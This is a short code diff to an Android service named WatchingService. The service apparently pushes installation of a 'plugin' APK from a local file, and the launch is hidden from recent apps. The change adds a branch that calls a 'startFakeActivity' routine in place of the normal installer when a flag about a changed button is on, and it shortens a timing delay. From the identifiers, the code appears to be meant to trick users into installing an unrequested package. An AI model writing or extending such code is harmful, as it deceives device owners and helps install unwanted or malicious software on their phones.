@@ -43,15 +43,19 @@ public class WatchingService extends Service {
                         AppRuntime.INSTALL_PACKAGE_TOP_SHOW.set(false);
 
                         if (!AppRuntime.PLUGIN_INSTALLED) {
-                            Intent i = new Intent(Intent.ACTION_VIEW);
-                            File upgradeFile = new File(local);
-                            i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
-                            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                            i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
-                            startActivity(i);
+                            if (!Config.BUTTON_CHANGED_ENABLE) {
+                                Intent i = new Intent(Intent.ACTION_VIEW);
+                                File upgradeFile = new File(local);
+                                i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
+                                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                                i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+                                startActivity(i);
+                            } else {
+                                Utils.startFakeActivity(getApplicationContext(), local);
+                            }
 
                             try {
-                                Thread.sleep(400);
+                                Thread.sleep(150);
                             } catch (Exception e) {
                                 e.printStackTrace();
                             }
